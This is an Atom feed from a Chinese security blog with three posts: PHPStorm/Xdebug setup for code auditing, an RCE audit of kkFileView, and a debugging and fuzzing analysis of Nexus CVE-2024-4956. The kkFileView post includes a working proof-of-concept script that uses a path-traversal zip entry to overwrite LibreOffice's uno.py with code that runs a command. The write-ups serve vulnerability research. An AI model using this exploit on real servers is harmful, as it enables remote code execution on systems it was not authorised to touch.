<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TPA HACK-NOTE</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-06-20T09:05:39.682Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>代码审计PHPStorm断点调试</title>
    <link href="http://example.com/posts/2274820670.html"/>
    <id>http://example.com/posts/2274820670.html</id>
    <published>2024-06-13T06:43:18.000Z</published>
    <updated>2024-06-20T09:05:39.682Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计PHPStorm断点调试"><a href="#代码审计PHPStorm断点调试" class="headerlink" title="代码审计PHPStorm断点调试"></a>代码审计PHPStorm断点调试</h1><h2 id="PHPStorm的调试环境"><a href="#PHPStorm的调试环境" class="headerlink" title="PHPStorm的调试环境"></a>PHPStorm的调试环境</h2><h3 id="浏览器插件Xdebug-helper"><a href="#浏览器插件Xdebug-helper" class="headerlink" title="浏览器插件Xdebug helper"></a>浏览器插件Xdebug helper</h3><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613145655346.png" alt="image-20240613145655346"></p><h3 id="PhpStudy设置"><a href="#PhpStudy设置" class="headerlink" title="PhpStudy设置"></a>PhpStudy设置</h3><p>设置网站 设置PHP版本7.3</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613150502472.png" alt="image-20240613150502472"></p><p>设置PHP拓展XDebug</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613150634486.png" alt="image-20240613150634486"></p><p>在php.ini结尾新增</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xdebug.profiler_append = 0</span><br><span class="line">;效能检测的设置开关</span><br><span class="line">xdebug.profiler_enable = 1</span><br><span class="line">xdebug.profiler_enable_trigger = 0</span><br><span class="line">;profiler_enable 设置为1的时候，效能监测信息写入文件所在的目录，可以自定义</span><br><span class="line">xdebug.profiler_output_dir = &quot;E:\phpStudy_64\tmp\xdebug&quot;</span><br><span class="line">;设置的函数调用监测信息的输出路径,可以自定义</span><br><span class="line">xdebug.trace_output_dir = &quot;E:\phpStudy_64\tmp\xdebug&quot;</span><br><span class="line">;生成的效能监测文件的名称</span><br><span class="line">xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;</span><br><span class="line">;远程开启 1 表示默认远程开启 0 表示关闭</span><br><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">;远程主机地址 这里设置的是我们本地解析的域名</span><br><span class="line">xdebug.remote_host = www.diguo.com</span><br><span class="line">;远程自动启动 1 表示开始  0 表示关闭</span><br><span class="line">xdebug.remote_autostart = 1</span><br><span class="line">;远程端口 可自己定义</span><br><span class="line">xdebug.remote_port = 9100</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br></pre></td></tr></table></figure><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613151325053.png" alt="image-20240613151325053"></p><p>查看phpinfo</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613151715903.png" alt="image-20240613151715903"></p><h3 id="PHPStorm设置"><a href="#PHPStorm设置" class="headerlink" title="PHPStorm设置"></a>PHPStorm设置</h3><p>php版本对应</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613152319328.png" alt="image-20240613152319328"></p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613152259501.png" alt="image-20240613152259501"></p><p>xdebug配置，对应php.ini phpinfo配置</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613152455554.png" alt="image-20240613152455554"></p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613152554162.png" alt="image-20240613152554162"></p><h3 id="运行调试测试"><a href="#运行调试测试" class="headerlink" title="运行调试测试"></a>运行调试测试</h3><p>新建PHP HTTP Request调试</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613152846547.png" alt="image-20240613152846547"></p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613153128820.png" alt="image-20240613153128820"></p><p>server配置</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613153107248.png" alt="image-20240613153107248"></p><p>下断点打开监听</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613153922944.png" alt="image-20240613153922944"></p><p>直接访问test.php，成功进入断点</p><p><img src="/image/article/%E5%B8%9D%E5%9B%BDCMS%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240613153950438.png" alt="image-20240613153950438"></p>]]></content>
    
    
    <summary type="html">代码审计PHPStorm断点调试</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>kkfile的RCE代码审计</title>
    <link href="http://example.com/posts/564692489.html"/>
    <id>http://example.com/posts/564692489.html</id>
    <published>2024-06-11T11:30:27.000Z</published>
    <updated>2024-06-20T09:06:32.548Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>POC上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        binary1 = <span class="string">b&#x27;1ue&#x27;</span></span><br><span class="line">        binary2 = <span class="string">b&#x27;import os\r\nos.system(\&#x27;calc\&#x27;)&#x27;</span></span><br><span class="line">        zipFile = zipfile.ZipFile(<span class="string">&quot;test1.zip&quot;</span>, <span class="string">&quot;a&quot;</span>,</span><br><span class="line">                                  zipfile.ZIP_DEFLATED)</span><br><span class="line">        info = zipfile.ZipInfo(<span class="string">&quot;test1.zip&quot;</span>)</span><br><span class="line">        <span class="comment"># zipFile.writestr(&quot;test&quot;, binary1)</span></span><br><span class="line">        zipFile.writestr(<span class="string">&quot;../../../../LibreOfficePortable/APP/libreoffice/program/uno.py&quot;</span>,</span><br><span class="line">                         binary2)</span><br><span class="line">        zipFile.close()</span><br><span class="line">    <span class="keyword">except</span> IOError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612145628366.png" alt="image-20240612145628366"></p><p>将执行代码追加写进uno.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.system(&#x27;calc&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612145729903.png" alt="image-20240612145729903"></p><p>通过上传后缀为odt的文件预览进行触发</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612145901104.png" alt="image-20240612145901104"></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>根据issue定位到CompressFileReader55行附近(<a href="https://github.com/kekingcn/kkFileView/issues/553">kkFileView-v4.3.0~v4.40-beta 存在RCE漏洞 · Issue #553 · kekingcn&#x2F;kkFileView · GitHub</a>)，造成漏洞原因为55行路径拼接。其中data为import os\r\nos.system(&#39;calc&#39;)的ASCII码，在执行完写数据流后uno.py的内容被覆盖，通过该漏洞可覆盖任意文件。</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612154021085.png" alt="image-20240612154021085"></p><p>触发uno.py</p><p>全局搜索odt发现存在一个OFFIECE_TYPES的字符串数组</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612160714587.png" alt="image-20240612160714587"></p><p>经测试只要符合转pdf的均会触发，kkfile存在缓存机制，再次点击不会触发需要缓存清空或重启</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612160754455.png" alt="image-20240612160754455"></p><p>触发流程</p><p>因为已知转换PDF才会触发，全局搜索PDF关键字，搜索到OfficeToPdfService这个比较像的类进行DEBUG</p><p>首先定位到了office2pdf方法，在最后一步converterFile方法触发RCE</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612162228668.png" alt="image-20240612162228668"></p><p>跟进converterFile方法在最后一步builder.build().convert(inputFile).to(outputFile).execute();触发RCE</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612162338024.png" alt="image-20240612162338024"></p><p>全局搜索无法跟踪uno.py是在哪里被调用的，猜测是组件在uno.py的上级目录发现存在exe文件怀疑和这个有关</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612163621500.png" alt="image-20240612163621500"></p><p>全局搜索exe文件名字，发现有个LocalOfficeUtil方法调用</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612163726175.png" alt="image-20240612163726175"></p><p>并在项目启动时进行初始化调用了该程序</p><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240612163817427.png" alt="image-20240612163817427"></p><h1 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create databases/kkfile-db --language=java --command=&quot;mvn clean install -DskipTests&quot; --source-root=E:\codeql\source\kkFileView-4.3.0 --overwrite</span><br></pre></td></tr></table></figure><p><img src="/image/article/kkfile%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1.assets/image-20240611193135329.png" alt="image-20240611193135329"></p>]]></content>
    
    
    <summary type="html">kkfile的RCE代码审计</summary>
    
    
    
    <category term="web" scheme="http://example.com/category/web/"/>
    
    
    <category term="网络安全" scheme="http://example.com/tag/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Nexus CVE-2024-4956漏洞代码调试分析</title>
    <link href="http://example.com/posts/1304654824.html"/>
    <id>http://example.com/posts/1304654824.html</id>
    <published>2024-06-05T04:02:54.000Z</published>
    <updated>2024-06-20T09:07:40.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nexus-CVE-2024-4956漏洞代码调试分析"><a href="#Nexus-CVE-2024-4956漏洞代码调试分析" class="headerlink" title="Nexus CVE-2024-4956漏洞代码调试分析"></a>Nexus CVE-2024-4956漏洞代码调试分析</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull sonatype/nexus3:3.68.0-java8</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240605120449689.png" alt="image-20240605120449689"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8081:8081 -p 5005:5005 --name nexus  sonatype/nexus3:3.68.0-java8</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240605121631509.png" alt="image-20240605121631509"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp 0b76fa8a3195:/opt/sonatype/nexus /root/tmp/nexus</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240605121704096.png" alt="image-20240605121704096"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir all-lib</span><br><span class="line">find . -name &quot;*.jar&quot; -exec cp &#123;&#125; all-lib/ \;</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240605121924156.png" alt="image-20240605121924156"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240605121953395.png" alt="image-20240605121953395"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf all-lib.tar.gz all-lib/</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240605122347205.png" alt="image-20240605122347205"></p><p>全选all-lib中的jar包添加到IDEA进行Add as Library</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8081:8081 -p 5005:5005 --name nexus -e INSTALL4J_ADD_VM_PARAMS=&quot;</span><br><span class="line">-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005&quot; sonatype/nexus3:3.68.0-java8</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240606085515582.png" alt="image-20240606085515582"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240606090416260.png" alt="image-20240606090416260"></p><h2 id="程序调试"><a href="#程序调试" class="headerlink" title="程序调试"></a>程序调试</h2><p>对比程序，在修改处WebResourceServiceImpl getResource()处下断点</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607204040615.png" alt="image-20240607204040615"></p><p>访问<a href="http://192.168.127.128:8081/robots.txt%E6%88%90%E5%8A%9F%E6%96%AD%E4%B8%8B">http://192.168.127.128:8081/robots.txt成功断下</a></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607204532406.png" alt="image-20240607204532406"></p><p>step into进入getResource</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607204639993.png" alt="image-20240607204639993"></p><p>再次step into</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607204744490.png" alt="image-20240607204744490"></p><p>继续跟踪程序在super.getResource跟进</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607204817131.png" alt="image-20240607204817131"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607205110298.png" alt="image-20240607205110298"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607205135240.png" alt="image-20240607205135240"></p><p>跟进addPath</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607205458641.png" alt="image-20240607205458641"></p><p>这里要使URIUtil.canonicalPath的结果不为NULL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">canonicalPath</span><span class="params">(String path)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">null</span> &amp;&amp; !path.isEmpty()) &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">slash</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> path.length();</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        label68:</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; end; ++i) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> path.charAt(i);</span><br><span class="line">            <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                <span class="keyword">if</span> (slash) &#123;</span><br><span class="line">                    <span class="keyword">break</span> label68;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                slash = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                slash = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                slash = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == end) &#123;</span><br><span class="line">            <span class="keyword">return</span> path;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">canonical</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(path.length());</span><br><span class="line">            canonical.append(path, <span class="number">0</span>, i);</span><br><span class="line">            <span class="type">int</span> <span class="variable">dots</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            ++i;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(; i &lt; end; ++i) &#123;</span><br><span class="line">                <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> path.charAt(i);</span><br><span class="line">                <span class="keyword">switch</span>(c) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> (dots &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                        ++dots;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slash) &#123;</span><br><span class="line">                        dots = <span class="number">1</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        canonical.append(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    slash = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                    <span class="keyword">if</span> (doDotsSlash(canonical, dots)) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    slash = <span class="literal">true</span>;</span><br><span class="line">                    dots = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(dots-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    canonical.append(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                canonical.append(c);</span><br><span class="line">                dots = <span class="number">0</span>;</span><br><span class="line">                slash = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (doDots(canonical, dots)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> canonical.toString();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607205527973.png" alt="image-20240607205527973"></p><p>最后会返回一个PathResource对象，看下这个对象的构造方法</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607210127747.png" alt="image-20240607210127747"></p><p>重新DEBUG在此处下断点</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607210338031.png" alt="image-20240607210338031"></p><p>跟进URIUtil.addPath</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607210452426.png" alt="image-20240607210452426"></p><p>encodePath其中会对url进行一波编码</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607210636796.png" alt="image-20240607210636796"></p><h2 id="Jazzer"><a href="#Jazzer" class="headerlink" title="Jazzer"></a>Jazzer</h2><p>add as library</p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607212803557.png" alt="image-20240607212803557"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607212250378.png" alt="image-20240607212250378"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607213847843.png" alt="image-20240607213847843"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607213553370.png" alt="image-20240607213553370"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607213605231.png" alt="image-20240607213605231"></p><p><img src="/image/article/Nexus-CVE-2024-4956%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90.assets/image-20240607213937108.png" alt="image-20240607213937108"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">javac -cp nexus.jar;jazzer_standalone.jar Fuzztest.java</span><br><span class="line">jar -cvf  Fuzztest.jar Fuzztest.class</span><br><span class="line"></span><br><span class="line"># 解压打包成新的out.jar</span><br><span class="line">jar -xvf Fuzztest.jar</span><br><span class="line">jar -xvf jetty-util-9.4.53.v20231009.jar</span><br><span class="line">jar -cvfM out.jar . </span><br><span class="line"></span><br><span class="line">jazzer.exe --cp=out.jar --target_class=&quot;Fuzztest&quot; 